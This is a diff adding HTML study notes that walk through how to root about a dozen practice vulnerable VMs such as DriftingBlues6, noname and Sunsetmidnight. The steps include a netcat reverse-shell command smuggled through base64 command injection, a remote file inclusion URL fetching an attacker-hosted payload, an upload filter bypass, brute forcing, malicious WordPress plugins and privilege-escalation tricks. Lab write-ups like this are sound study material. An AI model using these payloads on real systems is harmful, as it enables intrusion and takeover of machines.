@@ -1,0 +1,194 @@
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(65, 168, 95);">DriftingBlues6</span></strong></u></span></p>
+<p><span style="font-size: 20px;">-we find /textpattern/textpattern</span></p>
+<p><span style="font-size: 20px;">-robots also says do not forget zip.&nbsp;</span></p>
+<p><span style="font-size: 20px;">-and we then find spammer.zip</span></p>
+<p><span style="font-size: 20px;">-zip2john to get hash and then crack</span></p>
+<p><span style="font-size: 20px;">-unzip the file and we have creds</span></p>
+<p><span style="font-size: 20px;">-log into the CMS&nbsp;</span></p>
+<p><span style="font-size: 20px;">-the directory path shows: var/www/textpattern</span></p>
+<p><span style="font-size: 20px;">-click on Content --&gt; write --&gt; enter shell&nbsp;</span></p>
+<p><span style="font-size: 20px;">-when you to articles --&gt; click on &quot;live&quot; and another page loads with</span></p>
+<p><span style="font-size: 20px;">-different IP, but look at address format only /textpattern is used once.</span></p>
+<p><span style="font-size: 20px;">-As above when we found directory path.&nbsp;</span></p>
+<p><span style="font-size: 20px;">-using curl (or editing browser with your ip) lets call reverse shell</span></p>
+<p><span style="font-size: 20px;">-uname reveals a vuln os - dirtycow vulnerability</span></p>
+<p><span style="font-size: 20px;">-which sets up user firefart with privileged access</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(250, 197, 28);">Vegeta1</span></strong></u></span></p>
+<p><span style="font-size: 20px;">-Enumerated but no exploits nor could find a way in then :</span></p>
+<p><span style="font-size: 20px;">-find_me has find_me.html however when you do curl you get the comments! (or scroll down in source code)</span></p>
+<p><span style="font-size: 20px;">-decode base64 and we find another base64 decode that too.</span></p>
+<p><span style="font-size: 20px;">-which has .PNG - so must be a png image&nbsp;</span></p>
+<p><span style="font-size: 20px;">-it is a QR code - has password topshellv</span></p>
+<p><span style="font-size: 20px;">-the hahahaha.wav (from /bulma) is a morse code and you need a program to find out what it is saying</span></p>
+<p><span style="font-size: 20px;">-use a decoder site - upload the wav and get your user and pass</span></p>
+<p><span style="font-size: 20px;">-the password: U$3R is in small text (u$3r)</span></p>
+<p><span style="font-size: 20px;">-user can write to /etc/passwd - so gets elevated access</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(184, 49, 47);">seppuki</span></strong></u></span></p>
+<p><span style="font-size: 20px;">-found 3 usernames with enum4linux, but no shares to access</span></p>
+<p><span style="font-size: 20px;">-visit each of the http sites &nbsp;- run a directory scan on each</span></p>
+<p><span style="font-size: 20px;">-port 7601 has few directories: keys and secret</span></p>
+<p><span style="font-size: 20px;">-we find a private.bak key ( no idea whose it is as of yet)</span></p>
+<p><span style="font-size: 20px;">-in secrets we find hostname, shadow and passwd files + password list</span></p>
+<p><span style="font-size: 20px;">-lets use passlist with hydra and user seppuki</span></p>
+<p><span style="font-size: 20px;">-as it is rbash log in with : -t &quot;bash --noprofile&quot;</span></p>
+<p><span style="font-size: 20px;">-do usual: uname, sudo -l (cannot really use this as no purpose)</span></p>
+<p><span style="font-size: 20px;">-in home directory we find .passwd - 12345685213456!@!@A</span></p>
+<p><span style="font-size: 20px;">-lets try to su in as other users: it works for samurai</span></p>
+<p><span style="font-size: 20px;">- do sudo -l - says we can run something in tanto home directory</span></p>
+<p><span style="font-size: 20px;">- when visiting it does not exist</span></p>
+<p><span style="font-size: 20px;">-so we need to get access in as Tanto - perfect way to use that private.bak key</span></p>
+<p><span style="font-size: 20px;">- ssh in tanto using that</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 20px;">mkdir .cgi_bin</span></p>
+<p><span style="font-size: 20px;">cd .cgi_bin/</span></p>
+<p><span style="font-size: 20px;">echo &quot;/bin/bash&quot; &gt; bin</span></p>
+<p><span style="font-size: 20px;">chmod 777 bin</span></p>
+<p><br></p>
+<p><span style="font-size: 20px;">- then back to user samurai and run the sudo -l command to get root access</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(85, 57, 130);">evilbox-one</span></strong></u></span></p>
+<p><span style="font-size: 20px;">- we run a gobuster can and find /secret</span></p>
+<p><span style="font-size: 20px;">- we then need to do a deeper scan on secret and search for .php files</span></p>
+<p><span style="font-size: 20px;">- we find evil.php</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; - no more sites can be after this as it is php</span></p>
+<p><span style="font-size: 20px;">- but since we have no other access in we now need to do a ffuf scan</span></p>
+<p><span style="font-size: 20px;">- and see is there any parameters we can exploit after evil.php</span></p>
+<p><span style="font-size: 20px;">(ie evil.php?FUZZ=/etc/passwd</span></p>
+<p><span style="font-size: 20px;">- we are aiming for LFI</span></p>
+<p><span style="font-size: 20px;">- running a ffuf scan we discover &quot;command&quot;</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; &nbsp;- evil.php?command=/etc/passwd</span></p>
+<p><span style="font-size: 20px;">- we find user mowree</span></p>
+<p><span style="font-size: 20px;">-to get further information:</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; &nbsp;-php://filter/convert.base64-encode/resource=evil.php</span></p>
+<p><span style="font-size: 20px;">-then base 64 decode it to see what is going on</span></p>
+<p><span style="font-size: 20px;">-moving on: using the browser LFI get the users .ssh keys</span></p>
+<p><span style="font-size: 20px;">-(look in source code)</span></p>
+<p><span style="font-size: 20px;">-using ssh2john (as it has a passphrase) output to hash and then crack</span></p>
+<p><span style="font-size: 20px;">-running linpeas.sh we discover user can insert into /etc/passwd -&nbsp;</span></p>
+<p><span style="font-size: 20px;">-using openssl passwd generate a password and echo into</span></p>
+<p><span style="font-size: 20px;">-usr/bin/find . -exec /bin/sh -p \; -quit</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(41, 105, 176);">So_simple</span></strong></u></span></p>
+<p><span style="font-size: 20px;">-view sourced and there is a comment there</span></p>
+<p><span style="font-size: 20px;">-wordpress site - run wpscan</span></p>
+<p><span style="font-size: 20px;">- using wpscan to crack username max password: &nbsp;-U max -P /usr/share</span></p>
+<p><span style="font-size: 20px;">- we find the credentials and log in as max</span></p>
+<p><span style="font-size: 20px;">-no where to add for reverse shell so lets look at the vuln plugins: Social Warfare v3.5.0&apos;</span></p>
+<p><span style="font-size: 20px;">-Social Warfare v3.5.0&apos; &nbsp;- <a href="https://github.com/hash3liZer/CVE-2019-9978">https://github.com/hash3liZer/CVE-2019-9978</a> (doesnt work)</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 20px;">-<a href="https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618">https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618</a> - use this</span></p>
+<p><span style="font-size: 20px;">and host it using python server</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 20px;">-<a href="http://192.168.68.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&">http://192.168.68.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;amp</a>;swp_url=<a href="http://192.168.49.68:8000/payload.txt">http://192.168.49.68:8000/payload.txt</a></span></p>
+<p><span style="font-size: 20px;">-we find a user called: steven and max is there too</span></p>
+<p><span style="font-size: 20px;">-attempt hydra attack on user steven - no luck</span></p>
+<p><span style="font-size: 20px;">-lets see what is in max directory - we have maxs Id-rsa</span></p>
+<p><span style="font-size: 20px;">-(steven) NOPASSWD: /usr/sbin/service - so max can run as steven</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 20px;">-how to use:</span></p>
+<p><span style="font-size: 20px;">-sudo -u steven &lt;exploit&gt;</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 20px;">-sudo -l reveals a server-health.sh script, in /opt/tools</span></p>
+<p><span style="font-size: 20px;">-however /tools does not exist, so lets create tools and also the server-health.sh</span></p>
+<p><span style="font-size: 20px;">-(with a bash payload)</span></p>
+<p><span style="font-size: 20px;">-make sure to CHMOD +X the script</span></p>
+<p><span style="font-size: 20px;">-then run as: sudo -u root &lt;path&gt;</span></p>
+<p><br></p>
+<p><span style="font-size: 36px;"><strong><u><span style="color: rgb(251, 160, 38);">blogger</span></u></strong></span></p>
+<p><span style="font-size: 20px;">-only 2 ports open : 80 and 22</span></p>
+<p><span style="font-size: 20px;">-on dir scan you find 4 directories - check them all</span></p>
+<p><span style="font-size: 20px;">-because in assests you find fonts directory which has a blog &nbsp;directory</span></p>
+<p><span style="font-size: 20px;">-need to add blogger.thm to /etc/hosts</span></p>
+<p><span style="font-size: 20px;">-run wpscan</span></p>
+<p><span style="font-size: 20px;">-there is a upload button on comments section of blog post</span></p>
+<p><span style="font-size: 20px;">-it will not let you upload a reverse php shell even if you change extension</span></p>
+<p><span style="font-size: 20px;">-in burp you need to add: GIF89a; before the php&nbsp;</span></p>
+<p><span style="font-size: 20px;">-we find james and vagrant</span></p>
+<p><span style="font-size: 20px;">-we su in vagrant using passwd vagrant ( keep this in mind in future)</span></p>
+<p><span style="font-size: 20px;">-sudo su shows vagrant can run ALL NO passwd, so just do su root&nbsp;</span></p>
+<p><br></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(65, 168, 95);">noname</span></strong></u></span></p>
+<p><span style="font-size: 20px;">- port 80 open</span></p>
+<p><span style="font-size: 20px;">-find 2 directories: /admin has a page with some pages</span></p>
+<p><span style="font-size: 20px;">-in source code you find passphrase:harder</span></p>
+<p><span style="font-size: 20px;">-potential steg - download the pictures from page and try steghide</span></p>
+<p><span style="font-size: 20px;">-we find a imp.txt - which is decoded</span></p>
+<p><span style="font-size: 20px;">-it reveals a superadmin.php page</span></p>
+<p><span style="font-size: 20px;">-command injections works with |&nbsp;</span></p>
+<p><span style="font-size: 20px;">-lets check out the page: cat superadmin.php -shows we cannot run some commands</span></p>
+<p><span style="font-size: 20px;">-using base64 encoding we can send commands as:</span></p>
+<p><span style="font-size: 20px;">-127.0.0.1 | `echo &quot;command in base64&quot; | base64 -d`</span></p>
+<p><span style="font-size: 20px;">-(notice the back tricks are needed for command to execute)</span></p>
+<p><span style="font-size: 20px;">-base64encode: nc.traditional -e /bin/bash &lt;ip&gt; &lt;port&gt;</span></p>
+<p><span style="font-size: 20px;">-(read on NC.TRADITIONAL - very important)</span></p>
+<p><span style="font-size: 20px;">-set up listener and you have shell</span></p>
+<p><span style="font-size: 20px;">-look in users directories (find / type f -user yash 2&gt;/dev/null)</span></p>
+<p><span style="font-size: 20px;">-find- hidden/.passwd - for haclabs username</span></p>
+<p><span style="font-size: 20px;">-running linpeas.sh and you discover Find command</span></p>
+<p><span style="font-size: 20px;">-use gtfo bins to get root&nbsp;</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(209, 72, 65);">funbox fritz</span></strong></u></span></p>
+<p><span style="font-size: 20px;">- wpscan --enumerate --api-token</span></p>
+<p><span style="font-size: 20px;">- wpscan for password cracking user joe. -U joe -P rockyou.txt</span></p>
+<p><span style="font-size: 20px;">- we log into wp-admin as joe - nothing here</span></p>
+<p><span style="font-size: 20px;">- we now reuse password for ftp and we have access (and SSH same password)</span></p>
+<p><span style="font-size: 20px;">- found another user called funny</span></p>
+<p><span style="font-size: 20px;">- mbox has message in there. - backupscript&nbsp;</span></p>
+<p><br></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(85, 57, 130);">election1</span></strong></u></span></p>
+<p><span style="font-size: 20px;">- we find 2 ports: 22, 80</span></p>
+<p><span style="font-size: 20px;">- find few directories, and a username love&nbsp;</span></p>
+<p><span style="font-size: 20px;">- cannot find a way in and also blocked from webapp for password attempts</span></p>
+<p><span style="font-size: 20px;">- card.php is all decimal and converted comes back to &quot;170&quot; - no luck</span></p>
+<p><span style="font-size: 20px;">- hydra - no luck</span></p>
+<p><span style="font-size: 20px;">- gobuster scan on /election/admin - we find logs -&gt; system.log with password for love</span></p>
+<p><span style="font-size: 20px;">- remember we have portal and ssh - try both</span></p>
+<p><span style="font-size: 20px;">- we are in system we run: find on perm u=s and find Serv-U/Serv-U</span></p>
+<p><span style="font-size: 20px;">- search for exploits for ServU</span></p>
+<p><span style="font-size: 20px;">- compile and run the c code and you have root</span></p>
+<p><span style="font-size: 20px;"><br></span></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(61, 142, 185);">BTRsys2.1</span></strong></u></span></p>
+<p><span style="font-size: 20px;">- 3 ports open -22,80,3306</span></p>
+<p><span style="font-size: 20px;">- wordpress site</span></p>
+<p><span style="font-size: 20px;">- default admin admin worked on log in</span></p>
+<p><span style="font-size: 20px;">- wpscan on /wordpress - 2 users found: btrisk and admin</span></p>
+<p><span style="font-size: 20px;">- wpscan brute force - no luck</span></p>
+<p><span style="font-size: 20px;">- go to apperance --&gt; editor &nbsp;(reverse shell in 404 or index)</span></p>
+<p><span style="font-size: 20px;">- to activate - we just type IP/wordpress/index.php (no need to locate the themes etc)</span></p>
+<p><span style="font-size: 20px;">- running linpeas we find wp-config.php which has credentials</span></p>
+<p><span style="font-size: 20px;">- mysql -u root -p</span></p>
+<p><span style="font-size: 20px;">- show databases; use &lt;db name&gt;; show tables; select * from wp_users</span></p>
+<p><br></p>
+<p><span style="font-size: 36px;"><u><strong><span style="color: rgb(250, 197, 28);">Sunsetmidnight</span></strong></u></span></p>
+<p><span style="font-size: 20px;">- it is a wordpress site</span></p>
+<p><span style="font-size: 20px;">- run wpscan - we find admin</span></p>
+<p><span style="font-size: 20px;">- brute force using wpscan - no luck</span></p>
+<p><span style="font-size: 20px;">- we find /rdf</span></p>
+<p><span style="font-size: 20px;">- using hydra to attack mysql: hydra -l root -P /usr/share/wordlists/rockyou.txt sunset-midnight mysql</span></p>
+<p><span style="font-size: 20px;">- now use creds to connect to mysql: mysql -u root -p -h &lt;IP&gt;</span></p>
+<p><span style="font-size: 20px;">- once you have hash - crack using john</span></p>
+<p><span style="font-size: 20px;">&nbsp;- no luck in cracking but since we are root we can update admin password</span></p>
+<p><span style="font-size: 20px;">-&nbsp; note you need to generate a wordpress password so search online for generator</span></p>
+<p><span style="font-size: 20px;">- change user pass: &nbsp;update wp_users , set user_pass = &apos;$P$BUGmr7QDxS0Ahm.HkD9yD/BzAIe1g/0&apos;;</span></p>
+<p><span style="font-size: 20px;">- once logged in - apperance -&gt; theme editor -&gt; edit index.php with reverse shell</span></p>
+<p><span style="font-size: 20px;">- will not allow me to do so need to look into vulnerable plugin</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; - downloaded malicious-wordpress-plugin from github</span></p>
+<p><span style="font-size: 20px;">- usage: python wordpwn.py IP port Y &nbsp;(Y = yes to handler)</span></p>
+<p><span style="font-size: 20px;">- upload the malicious.zip (plugins --&gt; add new --&gt; upload --&gt; install now</span></p>
+<p><span style="font-size: 20px;">- click activate in the plugin section under name here it was &quot;gotem&quot;</span></p>
+<p><span style="font-size: 20px;">- to get reverse: /wp-content/plugins/malicious (without the .zip extension) and now select wetwork.php</span></p>
+<p><span style="font-size: 20px;">- now start enumerating the box as www-data</span></p>
+<p><span style="font-size: 20px;">- we find user jose -&nbsp;</span></p>
+<p><span style="font-size: 20px;">- running linpeas.sh we discover a db password</span></p>
+<p><span style="font-size: 20px;">- we cannot crack it, lets just sign in with it: jose: 645dc5a8871d2a4269d4cbe23f6ae103</span></p>
+<p><span style="font-size: 20px;">- we find: /usr/bin/status &nbsp;(when searching for perm files)</span></p>
+<p><span style="font-size: 20px;">- run strings command on status&nbsp;</span></p>
+<p><span style="font-size: 20px;">- it is trying to run ssh service without a full path - lets exploit this</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; touch service</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; echo &apos;/bin/sh&apos; &gt; service</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp; chmod 755 service</span></p>
+<p><span style="font-size: 20px;">&nbsp; &nbsp;&nbsp;</span></p>
+<p><span style="font-size: 20px;">- then change joses path: PATH=/home/jose:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin</span></p>
+<p><span style="font-size: 20px;">- run /usr/bin/status</span></p>
